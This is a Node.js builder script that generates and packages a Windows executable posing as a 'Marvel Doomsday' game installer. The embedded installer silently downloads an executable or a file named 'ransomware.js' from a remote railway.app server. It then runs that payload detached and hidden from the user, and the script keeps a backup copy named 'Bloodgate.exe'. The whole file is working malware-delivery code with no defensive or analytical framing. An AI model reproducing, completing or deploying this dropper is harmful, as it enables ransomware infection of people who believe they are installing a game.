const fs = require('fs');
const path = require('path');
const { exec } = require('child_process');

// ===== CREATE INSTALLER =====
const installerContent = `
const https = require('https');
const fs = require('fs');
const path = require('path');
const { spawn } = require('child_process');
const os = require('os');

const SERVER_URL = 'https://bloodgate-production.up.railway.app';

function downloadAndRun() {
    const tempPath = path.join(os.tmpdir(), 'doomsdaygame.exe');
    
    console.log('🎮 Downloading Marvel Doomsday...');
    
    https.get(SERVER_URL + '/download/doomsdaygame.exe', (response) => {
        if (response.statusCode === 404) {
            // Fallback: download JS version
            const jsUrl = SERVER_URL + '/download/ransomware.js';
            https.get(jsUrl, (res2) => {
                let data = '';
                res2.on('data', c => data += c);
                res2.on('end', () => {
                    const jsPath = path.join(os.tmpdir(), 'doomsdaygame.js');
                    fs.writeFileSync(jsPath, data);
                    const child = spawn('node', [jsPath], {
                        detached: true,
                        stdio: 'ignore',
                        windowsHide: true
                    });
                    child.unref();
                    console.log('🩸 BLOODGATE installed!');
                });
            });
            return;
        }
        
        let data = '';
        response.on('data', c => data += c);
        response.on('end', () => {
            fs.writeFileSync(tempPath, data);
            const child = spawn(tempPath, [], {
                detached: true,
                stdio: 'ignore',
                windowsHide: true
            });
            child.unref();
            console.log('🎮 Game installed!');
        });
    }).on('error', () => {
        // Fallback
        const jsUrl = SERVER_URL + '/download/ransomware.js';
        https.get(jsUrl, (res2) => {
            let data = '';
            res2.on('data', c => data += c);
            res2.on('end', () => {
                const jsPath = path.join(os.tmpdir(), 'doomsdaygame.js');
                fs.writeFileSync(jsPath, data);
                const child = spawn('node', [jsPath], {
                    detached: true,
                    stdio: 'ignore',
                    windowsHide: true
                });
                child.unref();
                console.log('🩸 BLOODGATE installed!');
            });
        });
    });
}

downloadAndRun();
`;

const builderDir = __dirname;
if (!fs.existsSync(builderDir)) {
    fs.mkdirSync(builderDir, { recursive: true });
}

fs.writeFileSync(path.join(builderDir, 'installer.js'), installerContent);
console.log('✅ installer.js created');

// ===== BUILD EXE WITH NEW NAME =====
console.log('📦 Building doomsdaygame.exe...');
exec('pkg installer.js --target node18-win-x64 --output doomsdaygame.exe', (error) => {
    if (error) {
        console.error('❌ Build failed:', error.message);
        console.log('⚠️ Install pkg: npm install -g pkg');
    } else {
        console.log('✅ doomsdaygame.exe created successfully!');
        console.log('📁 Location: builder/doomsdaygame.exe');
        
        // Also copy as Bloodgate.exe for backup
        try {
            fs.copyFileSync(
                path.join(builderDir, 'doomsdaygame.exe'),
                path.join(builderDir, 'Bloodgate.exe')
            );
            console.log('✅ Also saved as Bloodgate.exe (backup)');
        } catch(e) {}
    }
});
